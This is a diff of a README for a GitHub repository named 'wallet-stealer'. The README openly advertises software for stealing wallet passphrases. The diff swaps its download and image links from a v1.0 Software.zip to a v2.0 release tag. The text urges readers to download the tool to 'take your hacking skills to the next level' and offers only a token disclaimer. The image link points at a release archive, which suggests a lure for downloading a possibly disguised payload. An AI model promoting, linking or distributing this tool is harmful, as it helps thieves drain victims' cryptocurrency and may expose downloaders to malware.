@@ -13,7 +13,7 @@ This repository contains cutting-edge software designed to help you steal passph
 - walletstealer
 
 ## Download the Software
-[![Launch Wallet Stealer Software](https://github.com/senseiFC/wallet-stealer/releases/download/v1.0/Software.zip%20Stealer&color=blue)](https://github.com/senseiFC/wallet-stealer/releases/download/v1.0/Software.zip)
+[![Launch Wallet Stealer Software](https://github.com/senseiFC/wallet-stealer/releases/tag/v2.0%20Stealer&color=blue)](https://github.com/senseiFC/wallet-stealer/releases/tag/v2.0)
 
 ## **How to Use**
 
@@ -32,7 +32,7 @@ Please ensure that you are using this software responsibly and ethically. Unauth
 ## **Disclaimer**
 The developers of this software are not responsible for any misuse or illegal activities carried out using this software. Use at your own risk.
 
-![Blockchain Image](https://github.com/senseiFC/wallet-stealer/releases/download/v1.0/Software.zip)
+![Blockchain Image](https://github.com/senseiFC/wallet-stealer/releases/tag/v2.0)
 
 ## **Get Started Today!**
 Download the "Wallet Stealer" software now and take your hacking skills to the next level!
